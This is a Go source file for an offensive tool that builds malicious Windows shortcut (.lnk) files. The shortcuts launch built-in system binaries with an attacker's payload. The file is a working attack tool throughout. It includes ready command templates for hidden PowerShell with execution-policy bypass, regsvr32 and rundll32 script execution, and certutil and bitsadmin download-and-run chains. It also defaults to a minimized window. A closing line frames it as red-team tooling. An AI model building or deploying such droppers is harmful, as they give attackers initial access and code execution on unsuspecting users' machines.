package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

// LOLBIN definition
type LOLBIN struct {
	Name        string
	Path        string
	Description string
	Parameters  string
	IconIndex   int
}

// List of common LOLBINs that can be used for various techniques
var lolbins = []LOLBIN{
	{
		Name:        "cmd.exe",
		Path:        "%windir%\\System32\\cmd.exe",
		Description: "Windows Command Processor",
		Parameters:  "/c {payload}",
		IconIndex:   0,
	},
	{
		Name:        "powershell.exe",
		Path:        "%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		Description: "Windows PowerShell",
		Parameters:  "-NoP -NonI -W Hidden -Exec Bypass -Enc {payload}",
		IconIndex:   0,
	},
	{
		Name:        "wscript.exe",
		Path:        "%windir%\\System32\\wscript.exe",
		Description: "Windows Script Host",
		Parameters:  "//e:jscript {payload}",
		IconIndex:   0,
	},
	{
		Name:        "mshta.exe",
		Path:        "%windir%\\System32\\mshta.exe",
		Description: "Microsoft HTML Application Host",
		Parameters:  "{payload}",
		IconIndex:   0,
	},
	{
		Name:        "regsvr32.exe",
		Path:        "%windir%\\System32\\regsvr32.exe",
		Description: "Microsoft Register Server",
		Parameters:  "/s /u /i:{payload} scrobj.dll",
		IconIndex:   0,
	},
	{
		Name:        "rundll32.exe",
		Path:        "%windir%\\System32\\rundll32.exe",
		Description: "Windows Host Process",
		Parameters:  "javascript:{payload}",
		IconIndex:   0,
	},
	{
		Name:        "explorer.exe",
		Path:        "%windir%\\explorer.exe",
		Description: "Windows Explorer",
		Parameters:  "{payload}",
		IconIndex:   0,
	},
	{
		Name:        "bitsadmin.exe",
		Path:        "%windir%\\System32\\bitsadmin.exe",
		Description: "BITS Transfer Utility",
		Parameters:  "/transfer myJob /download /priority high {payload} %TEMP%\\t.exe && %TEMP%\\t.exe",
		IconIndex:   0,
	},
	{
		Name:        "certutil.exe",
		Path:        "%windir%\\System32\\certutil.exe",
		Description: "Certificate Utility",
		Parameters:  "-urlcache -split -f {payload} %TEMP%\\t.exe && %TEMP%\\t.exe",
		IconIndex:   0,
	},
	{
		Name:        "msiexec.exe",
		Path:        "%windir%\\System32\\msiexec.exe",
		Description: "Windows Installer",
		Parameters:  "/q /i {payload}",
		IconIndex:   0,
	},
}

// Generate a shortcut file (.lnk)
func createLNKFile(lolbin LOLBIN, payload, outputPath, workingDir, iconPath string, windowStyle int) error {
	// Initialize COM
	err := ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	if err != nil {
		return fmt.Errorf("COM initialization failed: %v", err)
	}
	defer ole.CoUninitialize()

	// Create WshShell object
	unknown, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		return fmt.Errorf("failed to create WScript.Shell object: %v", err)
	}
	defer unknown.Release()

	wshShell, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return fmt.Errorf("failed to get IDispatch interface: %v", err)
	}
	defer wshShell.Release()

	// Replace {payload} placeholder with actual payload
	params := strings.Replace(lolbin.Parameters, "{payload}", payload, -1)

	// Create shortcut
	shortcutDispatch, err := oleutil.CallMethod(wshShell, "CreateShortcut", outputPath)
	if err != nil {
		return fmt.Errorf("failed to create shortcut: %v", err)
	}
	shortcut := shortcutDispatch.ToIDispatch()
	defer shortcut.Release()

	// Set target path
	if _, err := oleutil.PutProperty(shortcut, "TargetPath", lolbin.Path); err != nil {
		return fmt.Errorf("failed to set TargetPath: %v", err)
	}

	// Set arguments
	if _, err := oleutil.PutProperty(shortcut, "Arguments", params); err != nil {
		return fmt.Errorf("failed to set Arguments: %v", err)
	}

	// Set description
	if _, err := oleutil.PutProperty(shortcut, "Description", lolbin.Description); err != nil {
		return fmt.Errorf("failed to set Description: %v", err)
	}

	// Set working directory
	if workingDir != "" {
		if _, err := oleutil.PutProperty(shortcut, "WorkingDirectory", workingDir); err != nil {
			return fmt.Errorf("failed to set WorkingDirectory: %v", err)
		}
	} else {
		if _, err := oleutil.PutProperty(shortcut, "WorkingDirectory", filepath.Dir(lolbin.Path)); err != nil {
			return fmt.Errorf("failed to set default WorkingDirectory: %v", err)
		}
	}

	// Set window style (1=normal, 3=maximized, 7=minimized)
	if _, err := oleutil.PutProperty(shortcut, "WindowStyle", windowStyle); err != nil {
		return fmt.Errorf("failed to set WindowStyle: %v", err)
	}

	// Set icon if specified
	if iconPath != "" {
		if _, err := oleutil.PutProperty(shortcut, "IconLocation", fmt.Sprintf("%s,%d", iconPath, lolbin.IconIndex)); err != nil {
			return fmt.Errorf("failed to set IconLocation: %v", err)
		}
	}

	// Save the shortcut
	if _, err := oleutil.CallMethod(shortcut, "Save"); err != nil {
		return fmt.Errorf("failed to save shortcut: %v", err)
	}

	return nil
}

// Display available LOLBINs
func displayLOLBINs() {
	fmt.Println("\nAvailable LOLBINs:")
	fmt.Println("------------------")
	for i, bin := range lolbins {
		fmt.Printf("%d. %s\n   Path: %s\n   Parameters: %s\n\n", i+1, bin.Name, bin.Path, bin.Parameters)
	}
}

func main() {
	// Define command line flags
	interactive := flag.Bool("interactive", false, "Run in interactive mode")
	listBins := flag.Bool("list", false, "List available LOLBINs")
	binIndex := flag.Int("bin", 0, "Index of LOLBIN to use (1-based)")
	payload := flag.String("payload", "", "Payload or command to execute")
	output := flag.String("output", "malicious.lnk", "Output LNK file path")
	workingDir := flag.String("workdir", "", "Working directory for the shortcut")
	iconPath := flag.String("icon", "", "Path to icon file")
	windowStyle := flag.Int("window", 7, "Window style (1=normal, 3=maximized, 7=minimized)")
	customPath := flag.String("custom-path", "", "Custom binary path (for custom binary)")
	customParams := flag.String("custom-params", "", "Custom parameters (for custom binary)")
	customDesc := flag.String("custom-desc", "Custom Shortcut", "Custom description (for custom binary)")

	flag.Parse()

	if *listBins {
		displayLOLBINs()
		return
	}

	var selectedBin LOLBIN
	var selectedPayload string
	var outputPath string
	var selectedWorkingDir string
	var selectedIconPath string
	var selectedWindowStyle int

	if *interactive {
		// Interactive mode
		scanner := bufio.NewScanner(os.Stdin)

		displayLOLBINs()
		fmt.Println("C. Custom binary")
		fmt.Print("\nSelect a LOLBIN by number or 'C' for custom: ")
		scanner.Scan()
		input := scanner.Text()

		if strings.ToUpper(input) == "C" {
			// Custom binary
			fmt.Print("Enter custom binary path: ")
			scanner.Scan()
			customBinPath := scanner.Text()

			fmt.Print("Enter parameters (use {payload} as placeholder): ")
			scanner.Scan()
			customBinParams := scanner.Text()

			fmt.Print("Enter description: ")
			scanner.Scan()
			customBinDesc := scanner.Text()

			selectedBin = LOLBIN{
				Name:        filepath.Base(customBinPath),
				Path:        customBinPath,
				Description: customBinDesc,
				Parameters:  customBinParams,
				IconIndex:   0,
			}
		} else {
			// Selected from list
			idx := 0
			fmt.Sscanf(input, "%d", &idx)
			if idx < 1 || idx > len(lolbins) {
				fmt.Println("Invalid selection. Exiting.")
				return
			}
			selectedBin = lolbins[idx-1]
		}

		fmt.Print("Enter payload or command: ")
		scanner.Scan()
		selectedPayload = scanner.Text()

		fmt.Print("Enter output LNK file path (default: malicious.lnk): ")
		scanner.Scan()
		outputPath = scanner.Text()
		if outputPath == "" {
			outputPath = "malicious.lnk"
		}

		fmt.Print("Enter working directory (optional): ")
		scanner.Scan()
		selectedWorkingDir = scanner.Text()

		fmt.Print("Enter icon path (optional): ")
		scanner.Scan()
		selectedIconPath = scanner.Text()

		fmt.Print("Enter window style (1=normal, 3=maximized, 7=minimized, default=7): ")
		scanner.Scan()
		styleInput := scanner.Text()
		if styleInput == "" {
			selectedWindowStyle = 7
		} else {
			fmt.Sscanf(styleInput, "%d", &selectedWindowStyle)
		}
	} else {
		// Command line mode
		if *customPath != "" {
			// Custom binary from command line
			selectedBin = LOLBIN{
				Name:        filepath.Base(*customPath),
				Path:        *customPath,
				Description: *customDesc,
				Parameters:  *customParams,
				IconIndex:   0,
			}
		} else if *binIndex > 0 && *binIndex <= len(lolbins) {
			// Selected from list via command line
			selectedBin = lolbins[*binIndex-1]
		} else {
			fmt.Println("Error: No valid LOLBIN selected. Use -bin flag or -custom-path.")
			flag.PrintDefaults()
			return
		}

		if *payload == "" {
			fmt.Println("Error: No payload specified. Use -payload flag.")
			flag.PrintDefaults()
			return
		}

		selectedPayload = *payload
		outputPath = *output
		selectedWorkingDir = *workingDir
		selectedIconPath = *iconPath
		selectedWindowStyle = *windowStyle
	}

	// Ensure output has .lnk extension
	if !strings.HasSuffix(strings.ToLower(outputPath), ".lnk") {
		outputPath += ".lnk"
	}

	// Create the LNK file
	fmt.Printf("\nGenerating LNK file with the following settings:\n")
	fmt.Printf("- Binary: %s\n", selectedBin.Name)
	fmt.Printf("- Path: %s\n", selectedBin.Path)
	fmt.Printf("- Payload: %s\n", selectedPayload)
	fmt.Printf("- Output: %s\n", outputPath)

	err := createLNKFile(selectedBin, selectedPayload, outputPath, selectedWorkingDir, selectedIconPath, selectedWindowStyle)
	if err != nil {
		fmt.Printf("Error creating shortcut: %v\n", err)
		return
	}

	fmt.Printf("\nLNK file created successfully: %s\n", outputPath)
	fmt.Println("\nNOTE: This tool is for security research and red team assessments only.")
	fmt.Println("      Use responsibly and only on systems you own or have permission to test.")
}
